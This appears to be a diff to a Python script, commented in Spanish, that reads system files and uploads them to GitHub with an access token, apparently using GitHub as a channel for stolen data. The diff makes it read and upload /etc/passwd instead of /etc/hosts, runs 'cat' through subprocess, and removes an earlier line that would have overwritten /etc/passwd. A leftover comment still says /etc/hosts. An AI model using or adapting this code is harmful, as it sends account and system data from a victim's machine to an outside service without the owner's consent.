@@ -42,12 +42,12 @@ def uploadToGithub(filename, content, token):
         print('[-] Hubo un error al subir ' + filename + ' a GitHub.')
 
 def catAndUpload(filename, token):
-    # Leer el contenido del archivo
-    with open(filename, 'r') as f:
-        content = f.read()
+    # Leer el contenido del archivo con subprocess
+    result = subprocess.run(["cat", filename], capture_output=True, text=True)
+    content = result.stdout
 
     # Guardar el contenido en output.txt
-    output_filename = '/etc/passwd'
+    output_filename = 'output.txt'
     with open(output_filename, 'w') as f:
         f.write(content)
 
@@ -77,7 +77,8 @@ def run(token):
     uploadToGithub(output_filename, result.stdout, token)
 
     # Leer /etc/hosts y subirlo a GitHub
-    catAndUpload('/etc/hosts', token)
+    catAndUpload('/etc/passwd', token)
+
 
 
 
